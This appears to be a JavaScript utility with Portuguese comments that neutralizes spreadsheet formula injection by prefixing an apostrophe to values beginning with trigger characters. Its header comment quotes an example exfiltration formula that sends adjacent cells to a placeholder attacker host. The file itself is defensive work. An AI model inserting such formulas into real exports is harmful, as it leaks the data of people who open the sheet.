'use strict';

/**
 * Sanitização de valores contra injeção de fórmula em planilhas
 * (CSV Injection / Formula Injection — OWASP).
 *
 * O Tabulator só escapa aspas ao montar CSV/XLSX. Excel, LibreOffice e Google
 * Sheets, porém, AVALIAM campos que começam com `= + - @` mesmo entre aspas.
 * Como o nome do estabelecimento vem do Google Maps — ou seja, é escrito por
 * terceiro — um nome cadastrado como `=HYPERLINK("http://evil.tld/?"&A1)`
 * exfiltra células vizinhas quando a planilha é aberta e clicada.
 *
 * A neutralização é o padrão recomendado pela OWASP: prefixar um apóstrofo,
 * que faz a planilha tratar o conteúdo como texto sem alterar o valor visível
 * na própria célula.
 */

const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/** Neutraliza fórmula sem perder o valor original. Só mexe em string. */
function sanitizeForSpreadsheet(value) {
  if (typeof value !== 'string') return value;
  return FORMULA_TRIGGERS.test(value) ? `'${value}` : value;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { sanitizeForSpreadsheet, FORMULA_TRIGGERS };
}
